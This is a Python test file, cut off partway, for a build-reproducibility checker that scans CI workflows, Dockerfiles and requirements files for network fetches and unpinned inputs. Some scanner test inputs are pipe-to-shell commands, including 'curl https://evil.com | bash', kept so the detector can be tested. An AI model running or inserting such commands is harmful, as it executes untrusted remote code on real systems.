"""Tests for reproducibility sieve handlers."""

from pathlib import Path

import pytest
from darnit_reproducibility.handlers import (
    _detect_strong_hermeticity_signal,
    _iter_build_files,
    _iter_composite_action_files,
    _iter_container_files,
    _iter_other_ci_files,
    _iter_workflow_files,
    _maybe_check_witness_attestation,
    _scan_line,
    _strip_comment,
    repro_bit_for_bit_handler,
    repro_build_env_declared_handler,
    repro_deps_pinned_handler,
    repro_hermetic_build_handler,
    repro_provenance_exists_handler,
)
from darnit_reproducibility.witness_attestation import WitnessCheckResult

from darnit.sieve.handler_registry import HandlerContext, HandlerResultStatus

# _detect_strong_hermeticity_signal and repro_hermetic_build_handler both call
# check_witness_attestation(), which shells out to `gh` and the network. Tests
# that aren't specifically exercising that path stub it out to a no-op result;
# witness-specific tests override it again with monkeypatch.setattr.
NO_WITNESS_EVIDENCE = WitnessCheckResult(attempted=False)


@pytest.fixture(autouse=True)
def _stub_witness_attestation(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "darnit_reproducibility.handlers.check_witness_attestation",
        lambda ctx: NO_WITNESS_EVIDENCE,
    )


def make_ctx(tmp_path: Path, dependency_results: dict[str, str] | None = None) -> HandlerContext:
    return HandlerContext(
        local_path=str(tmp_path),
        owner="org",
        repo="repo",
        default_branch="main",
        control_id="RE-01.01",
        project_context={},
        gathered_evidence={},
        shared_cache={},
        dependency_results=dependency_results if dependency_results is not None else {},
    )


class TestStripComment:
    """Unit tests for the _strip_comment helper."""

    def test_full_comment_line_returns_empty(self) -> None:
        assert _strip_comment("# pip install requests") == ""

    def test_indented_comment_line_returns_empty(self) -> None:
        assert _strip_comment("  # - run: curl https://evil.com") == ""

    def test_inline_comment_is_stripped(self) -> None:
        result = _strip_comment("run: uv sync # install deps")
        assert result == "run: uv sync"
        assert "curl" not in result

    def test_inline_suspicious_comment_is_stripped(self) -> None:
        result = _strip_comment("run: uv sync # pip install requests")
        assert "pip install" not in result

    def test_line_without_comment_unchanged(self) -> None:
        assert _strip_comment("run: uv sync") == "run: uv sync"

    def test_hash_in_url_is_preserved(self) -> None:
        # A '#' not preceded by a space is not treated as a comment
        result = _strip_comment("run: curl https://example.com/file#anchor")
        assert "curl" in result


class TestScanLine:
    """Unit tests for the _scan_line classifier."""

    def test_violation_flagged(self) -> None:
        _, kind = _scan_line("  - run: pip install requests")
        assert kind == "violation"

    def test_safe_pattern_not_flagged(self) -> None:
        _, kind = _scan_line("  - run: npm ci")
        assert kind == "safe"

    def test_safe_overrides_suspicious(self) -> None:
        # pip install --no-index contains 'pip install ' but is safe
        _, kind = _scan_line("pip install --no-index -f /wheels -r requirements.txt")
        assert kind == "safe"

    def test_comment_line_is_safe(self) -> None:
        _, kind = _scan_line("# - run: curl https://evil.com | bash")
        assert kind == "safe"

    def test_empty_line_is_safe(self) -> None:
        _, kind = _scan_line("   ")
        assert kind == "safe"

    def test_dockerfile_apt_get_is_deferred(self) -> None:
        pattern, kind = _scan_line("RUN apt-get install -y build-essential", is_dockerfile=True)
        assert kind == "deferred"
        assert pattern == "apt-get install"

    def test_dockerfile_curl_is_still_violation(self) -> None:
        # curl inside a Dockerfile is not a system package — still a violation
        _, kind = _scan_line("RUN curl https://example.com/install.sh | bash", is_dockerfile=True)
        assert kind == "violation"

    def test_apt_get_outside_dockerfile_is_violation(self) -> None:
        # apt-get install in a workflow step is a live network fetch
        _, kind = _scan_line("  - run: apt-get install -y curl", is_dockerfile=False)
        assert kind == "violation"

    def test_pnpm_frozen_lockfile_is_safe(self) -> None:
        _, kind = _scan_line("run: pnpm install --frozen-lockfile")
        assert kind == "safe"

    def test_returns_matched_pattern(self) -> None:
        pattern, kind = _scan_line("run: wget https://example.com/tool.tar.gz")
        assert kind == "violation"
        assert pattern == "wget"


class TestScanLineNondeterminism:
    """Feature 038 (#432): the fourth scan kind.

    A `nondeterminism` match must not be classified as `violation`, or the
    handler would report a compiler flag under the network-fetch message.
    """

    @pytest.mark.parametrize("flag", ["-ffast-math", "-march=native", "-mtune=native"])
    def test_flags_classify_as_nondeterminism(self, flag: str) -> None:
        pattern, kind = _scan_line(f"gcc {flag} -o app main.c")
        assert kind == "nondeterminism"
        assert pattern == flag

    def test_network_fetch_still_wins_on_a_line_doing_both(self) -> None:
        """A line that fetches AND sets a flag is reported as the fetch, which
        is the larger problem."""
        _pattern, kind = _scan_line("pip install foo && gcc -march=native main.c")
        assert kind == "violation"

    def test_o3_is_not_a_finding(self) -> None:
        assert _scan_line("gcc -O3 -o app main.c") == (None, "safe")

    def test_commented_flag_is_safe(self) -> None:
        assert _scan_line("# gcc -march=native main.c") == (None, "safe")


class TestFileCollectors:
    """Unit tests for the _iter_* file-discovery helpers."""

    def test_workflow_files_found(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("")
        (wf_dir / "release.yaml").write_text("")
        result = _iter_workflow_files(tmp_path)
        assert len(result) == 2

    def test_workflow_files_missing_dir(self, tmp_path: Path) -> None:
        assert _iter_workflow_files(tmp_path) == []

    def test_composite_action_files_found(self, tmp_path: Path) -> None:
        action_dir = tmp_path / ".github" / "actions" / "setup"
        action_dir.mkdir(parents=True)
        (action_dir / "action.yml").write_text("")
        result = _iter_composite_action_files(tmp_path)
        assert len(result) == 1
        assert result[0].name == "action.yml"

    def test_composite_action_files_missing_dir(self, tmp_path: Path) -> None:
        assert _iter_composite_action_files(tmp_path) == []

    def test_other_ci_gitlab(self, tmp_path: Path) -> None:
        (tmp_path / ".gitlab-ci.yml").write_text("")
        result = _iter_other_ci_files(tmp_path)
        assert any(f.name == ".gitlab-ci.yml" for f in result)

    def test_other_ci_circleci(self, tmp_path: Path) -> None:
        circleci = tmp_path / ".circleci"
        circleci.mkdir()
        (circleci / "config.yml").write_text("")
        result = _iter_other_ci_files(tmp_path)
        assert any("config.yml" in str(f) for f in result)

    def test_other_ci_none_present(self, tmp_path: Path) -> None:
        assert _iter_other_ci_files(tmp_path) == []

    def test_build_files_root_makefile(self, tmp_path: Path) -> None:
        (tmp_path / "Makefile").write_text("")
        result = _iter_build_files(tmp_path)
        assert any(f.name == "Makefile" for f in result)

    def test_build_files_nested_makefile(self, tmp_path: Path) -> None:
        sub = tmp_path / "cmd" / "server"
        sub.mkdir(parents=True)
        (sub / "Makefile").write_text("")
        result = _iter_build_files(tmp_path)
        assert any(f.name == "Makefile" for f in result)

    def test_build_files_skips_vendor(self, tmp_path: Path) -> None:
        vendor = tmp_path / "vendor" / "pkg"
        vendor.mkdir(parents=True)
        (vendor / "Makefile").write_text("")
        result = _iter_build_files(tmp_path)
        assert not any("vendor" in str(f) for f in result)

    def test_build_files_scripts_dir(self, tmp_path: Path) -> None:
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "build.sh").write_text("")
        (scripts / "install-deps.sh").write_text("")
        result = _iter_build_files(tmp_path)
        names = [f.name for f in result]
        assert "build.sh" in names
        assert "install-deps.sh" in names

    def test_container_files_root_dockerfile(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text("")
        result = _iter_container_files(tmp_path)
        assert any(f.name == "Dockerfile" for f in result)

    def test_container_files_subdir(self, tmp_path: Path) -> None:
        docker_dir = tmp_path / "docker"
        docker_dir.mkdir()
        (docker_dir / "Dockerfile.prod").write_text("")
        result = _iter_container_files(tmp_path)
        assert any(f.name == "Dockerfile.prod" for f in result)

    def test_container_files_none_present(self, tmp_path: Path) -> None:
        assert _iter_container_files(tmp_path) == []


class TestDetectStrongSignal:
    """Unit tests for _detect_strong_hermeticity_signal.

    ``check_witness_attestation`` is stubbed to a no-op by the module-level
    ``_stub_witness_attestation`` fixture unless a test overrides it below.
    """

    def test_returns_none_with_no_signals(self, tmp_path: Path) -> None:
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [], {}, make_ctx(tmp_path), {})
        assert signal is None

    def test_witness_mention_alone_is_not_a_signal(self, tmp_path: Path) -> None:
        # Merely mentioning "witness run" in CI text proves the tool ran, not
        # what it observed — only a verified attestation with a clean network
        # log counts now (see test_verified_witness_attestation_is_a_signal).
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: witness run -- make build\n")
        signal, witness_result = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None
        assert witness_result.verified is False

    def test_verified_witness_attestation_is_a_signal(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        verified = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=True,
            detail="runtime-trace predicate recorded an empty network log",
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        signal, witness_result = _detect_strong_hermeticity_signal(tmp_path, [], {}, make_ctx(tmp_path), {})
        assert signal is not None
        assert "Witness" in signal
        assert witness_result is verified

    def test_verified_witness_attestation_with_network_activity_is_not_a_pass_signal(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        dirty = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=False,
            detail="runtime-trace predicate recorded 2 network event(s)",
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: dirty)
        signal, witness_result = _detect_strong_hermeticity_signal(tmp_path, [], {}, make_ctx(tmp_path), {})
        assert signal is None
        assert witness_result.network_clean is False

    def test_witness_check_disabled_via_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        verified = WitnessCheckResult(attempted=True, verified=True, network_clean=True, detail="clean")
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        signal, witness_result = _detect_strong_hermeticity_signal(
            tmp_path, [], {}, make_ctx(tmp_path), {"verify_witness_attestations": False}
        )
        # The mocked check_witness_attestation returns a verified/clean result,
        # but the config toggle must prevent it from ever being called.
        assert signal is None
        assert witness_result.attempted is False
        assert "disabled via config" in witness_result.detail

    def test_nix_flake_with_nix_build_in_ci(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is not None
        assert "Nix" in signal

    def test_nix_flake_present_but_no_ci_usage(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: uv sync\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is None

    def test_nix_flake_not_gated_without_build_env_declared_pass(self, tmp_path: Path) -> None:
        # flake.nix + CI usage looks right, but RE-01.02 (BuildEnvDeclared) never
        # ran or didn't PASS — withhold the signal rather than assume.
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None

    def test_nix_flake_not_gated_when_build_env_declared_failed(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "FAIL"}, make_ctx(tmp_path, {"RE-01.02": "FAIL"}), {}
        )
        assert signal is None

    def test_bazel_with_network_sandbox_flag(self, tmp_path: Path) -> None:
        (tmp_path / "MODULE.bazel").write_text("module(name = 'myproject')")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: bazel build //... --sandbox_default_allow_network=false\n")
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is not None
        assert "Bazel" in signal

    def test_bazel_workspace_without_sandbox_flag(self, tmp_path: Path) -> None:
        # Bazel allows network by default — workspace alone is not enough
        (tmp_path / "WORKSPACE").write_text("")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: bazel build //...\n")
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None

    def test_witness_takes_priority_over_nix(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # No CI file mentions "witness" at all here — the point of this test
        # is that a verified attestation still wins even though there is no
        # text-based hint that Witness is in use (e.g. it ran via a reusable
        # workflow the caller's own CI files never name).
        verified = WitnessCheckResult(attempted=True, verified=True, network_clean=True, detail="clean")
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("- run: nix build .#default\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is not None
        assert "Witness" in signal

    def test_commented_nix_reference_is_not_a_signal(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf = tmp_path / "ci.yml"
        wf.write_text("# TODO: nix build .#default someday\nsteps:\n  - run: uv sync\n")
        signal, _ = _detect_strong_hermeticity_signal(
            tmp_path, [wf], {"RE-01.02": "PASS"}, make_ctx(tmp_path, {"RE-01.02": "PASS"}), {}
        )
        assert signal is None

    def test_commented_bazel_sandbox_flag_is_not_a_signal(self, tmp_path: Path) -> None:
        (tmp_path / "MODULE.bazel").write_text("module(name = 'myproject')")
        wf = tmp_path / "ci.yml"
        wf.write_text(
            "steps:\n  # TODO: bazel build //... --sandbox_default_allow_network=false\n  - run: bazel build //...\n"
        )
        signal, _ = _detect_strong_hermeticity_signal(tmp_path, [wf], {}, make_ctx(tmp_path), {})
        assert signal is None


class TestMaybeCheckWitnessAttestation:
    """Unit tests for the config-toggle wrapper around check_witness_attestation()."""

    def test_disabled_via_config_short_circuits(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        called = False

        def spy(ctx: HandlerContext) -> WitnessCheckResult:
            nonlocal called
            called = True
            return WitnessCheckResult(attempted=True, verified=True, network_clean=True)

        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", spy)
        result = _maybe_check_witness_attestation(make_ctx(tmp_path), {"verify_witness_attestations": False})
        assert called is False
        assert result.attempted is False

    def test_enabled_by_default(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        expected = WitnessCheckResult(attempted=True, verified=True, network_clean=True)
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: expected)
        result = _maybe_check_witness_attestation(make_ctx(tmp_path), {})
        assert result is expected

    def test_explicitly_enabled_via_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        expected = WitnessCheckResult(attempted=True, verified=True, network_clean=True)
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: expected)
        result = _maybe_check_witness_attestation(make_ctx(tmp_path), {"verify_witness_attestations": True})
        assert result is expected


class TestRepoDepsPin:
    """Tests for repro_deps_pinned_handler()."""

    def test_pass_with_uv_lock(self, tmp_path: Path) -> None:
        (tmp_path / "uv.lock").write_text("lock content")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS
        assert "uv.lock" in result.message

    def test_pass_with_cargo_lock(self, tmp_path: Path) -> None:
        (tmp_path / "Cargo.lock").write_text("lock")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_package_lock_json(self, tmp_path: Path) -> None:
        (tmp_path / "package-lock.json").write_text("{}")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_fail_with_only_loose_manifest(self, tmp_path: Path) -> None:
        (tmp_path / "requirements.txt").write_text("requests>=2.0")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_inconclusive_with_no_deps(self, tmp_path: Path) -> None:
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_lock_and_loose_both_present_passes(self, tmp_path: Path) -> None:
        """A lock file takes precedence over a loose manifest -> PASS."""
        (tmp_path / "uv.lock").write_text("lock content")
        (tmp_path / "requirements.txt").write_text("requests>=2.0")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    # ------------------------------------------------------------------
    # Feature 037 (issue #429): requirements.txt contents are read, not
    # merely noticed. The six tests above predate this feature and are
    # deliberately unmodified -- `requests>=2.0` classifies UNPINNED and
    # still FAILs, so the pre-existing contract survives unchanged.
    # ------------------------------------------------------------------

    HASH = "a" * 64
    SHA1 = "d" * 40

    def _repo(self, tmp_path: Path, contents: str) -> Path:
        (tmp_path / "requirements.txt").write_text(contents, encoding="utf-8")
        return tmp_path

    def test_hash_pinned_requirements_passes(self, tmp_path: Path) -> None:
        """SC-001: the reporter's case in #429.

        Before this feature, a `pip-compile --generate-hashes` output got the
        same hard FAIL as a bare `numpy`.
        """
        repo = self._repo(
            tmp_path,
            f"click==8.1.7 \\\n    --hash=sha256:{self.HASH}\nnumpy==1.26.4 --hash=sha256:{self.HASH}\n",
        )
        result = repro_deps_pinned_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.PASS
        assert result.confidence == 0.8
        assert "hash" in result.message.lower(), (
            "the message must name hash-pinning, so the operator can tell the "
            "verdict came from reading the file rather than from its name"
        )

    def test_pass_evidence_records_what_was_inspected(self, tmp_path: Path) -> None:
        """FR-012: a reviewer can audit the verdict from the result alone."""
        repo = self._repo(tmp_path, f"numpy==1.26.4 --hash=sha256:{self.HASH}\n")
        evidence = repro_deps_pinned_handler({}, make_ctx(repo)).evidence
        assert evidence["inspected_file"] == "requirements.txt"
        assert evidence["classification"] == "hash_pinned"
        assert evidence["requirement_count"] == 1

    def test_version_pinned_warns_about_transitive_dependencies(self, tmp_path: Path) -> None:
        """SC-003 / FR-005. Not FAIL: this repo is meaningfully different from
        one using open ranges. Not PASS: its transitive dependencies float."""
        repo = self._repo(tmp_path, "numpy==1.26.4\nclick==8.1.7\n")
        result = repro_deps_pinned_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.WARN
        assert result.confidence == 0.8
        assert "transitive" in result.message.lower()

    def test_unpinned_names_an_offending_requirement(self, tmp_path: Path) -> None:
        """SC-002 / FR-006: actionable without re-deriving the finding."""
        repo = self._repo(tmp_path, "numpy>=1.26\nclick==8.1.7\n")
        result = repro_deps_pinned_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.FAIL
        assert "numpy>=1.26" in result.message

    def test_three_verdicts_are_mutually_distinct(self, tmp_path: Path) -> None:
        """SC-003: the whole point is that these stopped being one verdict."""
        statuses = set()
        for name, contents in (
            ("hashed", f"numpy==1.0 --hash=sha256:{self.HASH}\n"),
            ("pinned", "numpy==1.0\n"),
            ("loose", "numpy>=1.0\n"),
        ):
            repo = tmp_path / name
            repo.mkdir()
            (repo / "requirements.txt").write_text(contents, encoding="utf-8")
            statuses.add(repro_deps_pinned_handler({}, make_ctx(repo)).status)
        assert statuses == {
            HandlerResultStatus.PASS,
            HandlerResultStatus.WARN,
            HandlerResultStatus.FAIL,
        }

    def test_one_floating_dependency_governs(self, tmp_path: Path) -> None:
        """US2 scenario 3: the weakest line decides."""
        repo = self._repo(tmp_path, "numpy==1.0\nclick==2.0\nrequests>=2.0\n")
        assert repro_deps_pinned_handler({}, make_ctx(repo)).status == HandlerResultStatus.FAIL

    def test_vcs_sha_caps_the_file_at_warn(self, tmp_path: Path) -> None:
        """FR-010: a commit SHA pins, but it is never hash evidence."""
        repo = self._repo(
            tmp_path,
            f"numpy==1.0 --hash=sha256:{self.HASH}\npkg @ git+https://example.invalid/y@{self.SHA1}\n",
        )
        assert repro_deps_pinned_handler({}, make_ctx(repo)).status == HandlerResultStatus.WARN

    def test_empty_requirements_is_treated_as_absent(self, tmp_path: Path) -> None:
        """FR-011: a file declaring no dependencies is evidence of neither good
        nor bad practice, so the no-dependency-files verdict stands."""
        repo = self._repo(tmp_path, "# nothing here\n\n")
        result = repro_deps_pinned_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
        assert result.evidence["loose_manifests_found"] == []

    def test_empty_requirements_lets_another_manifest_decide(self, tmp_path: Path) -> None:
        repo = self._repo(tmp_path, "# nothing here\n")
        (repo / "setup.py").write_text("x", encoding="utf-8")
        result = repro_deps_pinned_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.FAIL
        assert "setup.py" in result.message
        assert "requirements.txt" not in result.message

    def test_unresolved_include_is_reported_as_not_inspected(self, tmp_path: Path) -> None:
        """FR-007: "we could not read it" must not read as "we read it and it
        is unpinned"."""
        repo = self._repo(tmp_path, "-r base.txt\n")
        result = repro_deps_pinned_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.FAIL
        assert "could not be" in result.message
        assert "inspect" in result.message

    def test_unreadable_file_never_reaches_the_classifier(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Contract T-7. Cannot be a committed fixture: needs a runtime chmod."""
        import darnit_reproducibility.requirements_pins as pins

        calls = []
        monkeypatch.setattr(
            pins,
            "classify",
            lambda text: (
                calls.append(text)
                or (_ for _ in ()).throw(AssertionError("classifier must not run on an unreadable file"))
            ),
        )
        repo = self._repo(tmp_path, "numpy==1.0\n")
        (repo / "requirements.txt").chmod(0o000)
        try:
            result = repro_deps_pinned_handler({}, make_ctx(repo))
        finally:
            (repo / "requirements.txt").chmod(0o644)
        assert result.status == HandlerResultStatus.FAIL
        assert "could not be inspected" in result.message
        assert calls == []

    def test_undecodable_file_never_reaches_the_classifier(self, tmp_path: Path) -> None:
        """Contract T-7: invalid UTF-8 is unreadable, not unpinned."""
        (tmp_path / "requirements.txt").write_bytes(b"numpy==1.0\n\xff\xfe\x00bad\n")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL
        assert "could not be inspected" in result.message
        assert result.evidence["classification"] == "not_inspectable"

    def test_option_lines_and_self_reference_do_not_change_the_verdict(self, tmp_path: Path) -> None:
        """FR-018: the file classifies on its requirements alone."""
        repo = self._repo(
            tmp_path,
            f"--index-url https://example.invalid/simple\n-e .\nnumpy==1.0 --hash=sha256:{self.HASH}\n",
        )
        assert repro_deps_pinned_handler({}, make_ctx(repo)).status == HandlerResultStatus.PASS

    def test_lock_file_short_circuits_before_reading_contents(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """FR-001 / US3: the lock file decides and the requirements contents
        are never consulted."""
        import darnit_reproducibility.requirements_pins as pins

        calls: list[str] = []
        original = pins.classify
        monkeypatch.setattr(pins, "classify", lambda text: calls.append(text) or original(text))
        (tmp_path / "uv.lock").write_text("lock content", encoding="utf-8")
        repo = self._repo(tmp_path, "numpy>=1.0\nclick>=8.0\n")
        result = repro_deps_pinned_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.PASS
        assert calls == [], "lock-file path must not read requirements.txt"

    def test_requirements_family_spellings_are_still_not_discovered(self, tmp_path: Path) -> None:
        """FR-019: discovery did not widen. A repo whose only requirements file
        is `requirements-dev.txt` is INCONCLUSIVE today and stays that way."""
        (tmp_path / "requirements-dev.txt").write_text("numpy>=1.0", encoding="utf-8")
        (tmp_path / "requirements").mkdir()
        (tmp_path / "requirements" / "base.txt").write_text("numpy>=1.0", encoding="utf-8")
        assert repro_deps_pinned_handler({}, make_ctx(tmp_path)).status == HandlerResultStatus.INCONCLUSIVE

    @pytest.mark.parametrize(
        ("filename", "contents"),
        [
            ("setup.py", "from setuptools import setup"),
            ("package.json", "{}"),
            ("Cargo.toml", "[package]"),
            ("go.mod", "module x"),
        ],
    )
    def test_other_loose_manifests_are_still_judged_by_presence(
        self, tmp_path: Path, filename: str, contents: str
    ) -> None:
        """FR-014: this feature changed nothing for them."""
        (tmp_path / filename).write_text(contents, encoding="utf-8")
        result = repro_deps_pinned_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL
        assert result.message.startswith("Dependency manifests found but no lock files:")


class TestBuildEnvDeclared:
    """Tests for repro_build_env_declared_handler()."""

    DIGEST = "sha256:" + "a" * 64

    def test_warn_with_tag_pinned_dockerfile(self, tmp_path: Path) -> None:
        """Feature 038 (#431). This asserted PASS until 2026-09.

        `python:3.11` is a tag. It is rebuilt and resolves to different bytes
        over time, which is the opposite of a declared environment.
        """
        (tmp_path / "Dockerfile").write_text("FROM python:3.11")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.WARN
        assert "python:3.11" in result.message

    def test_pass_with_digest_pinned_dockerfile(self, tmp_path: Path) -> None:
        """SC-003: the digest case keeps today's output exactly."""
        (tmp_path / "Dockerfile").write_text(f"FROM alpine@{self.DIGEST}")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS
        assert result.confidence == 0.85
        assert result.message == "Build environment declared via: Dockerfile (Docker)"

    def test_latest_tag_warns(self, tmp_path: Path) -> None:
        """SC-002: the shape #431 was filed about."""
        (tmp_path / "Dockerfile").write_text("FROM alpine:latest")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.WARN
        assert "alpine:latest" in result.message

    def test_multistage_does_not_report_the_stage_name(self, tmp_path: Path) -> None:
        """BE-4. `FROM builder` is a stage reference, not a registry image.

        Reporting it would produce a spurious finding on every multi-stage
        build, including this repository's own packaging/container/Dockerfile.
        """
        (tmp_path / "Dockerfile").write_text("FROM python:3.12 AS builder\nRUN true\nFROM builder\n")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.WARN
        assert "python:3.12" in result.message
        assert "builder" not in result.message

    def test_multistage_all_digest_pinned_passes(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text(f"FROM alpine@{self.DIGEST} AS builder\nFROM builder\n")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_containerfile_handled_like_dockerfile(self, tmp_path: Path) -> None:
        (tmp_path / "Containerfile").write_text("FROM alpine:latest")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.WARN

    def test_flake_wins_over_unpinned_dockerfile(self, tmp_path: Path) -> None:
        """BE-9: a stronger declaration is checked first."""
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        (tmp_path / "Dockerfile").write_text("FROM alpine:latest")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_dockerfile_without_from_is_treated_as_absent(self, tmp_path: Path) -> None:
        """BE-11: declares no base image, so it is evidence of neither."""
        (tmp_path / "Dockerfile").write_text("RUN echo hi\n")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_vagrantfile_unchanged_in_v0(self, tmp_path: Path) -> None:
        """BE-10: content-dependent in principle, not inspected yet."""
        (tmp_path / "Vagrantfile").write_text('config.vm.box = "ubuntu/jammy64"')
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_nix_flake(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_python_version_file(self, tmp_path: Path) -> None:
        (tmp_path / ".python-version").write_text("3.11.0")
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_inconclusive_with_nothing(self, tmp_path: Path) -> None:
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_with_devcontainer_dir(self, tmp_path: Path) -> None:
        """.devcontainer is a directory, not a file; it must still be detected."""
        (tmp_path / ".devcontainer").mkdir()
        result = repro_build_env_declared_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS


class TestHermeticBuild:
    """Integration tests for repro_hermetic_build_handler()."""

    # ------------------------------------------------------------------
    # No files
    # ------------------------------------------------------------------

    def test_inconclusive_with_no_files(self, tmp_path: Path) -> None:
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
        assert result.confidence == 0.0

    # ------------------------------------------------------------------
    # Clean grep → INCONCLUSIVE (not PASS — grep absence ≠ hermeticity)
    # ------------------------------------------------------------------

    def test_inconclusive_with_clean_workflow(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
        assert result.confidence == 0.4

    def test_inconclusive_editable_install_not_flagged(self, tmp_path: Path) -> None:
        """`pip install -e .` is a local editable install, not a network fetch."""
        wf_dir = tmp_path / ".github" / "workflows"
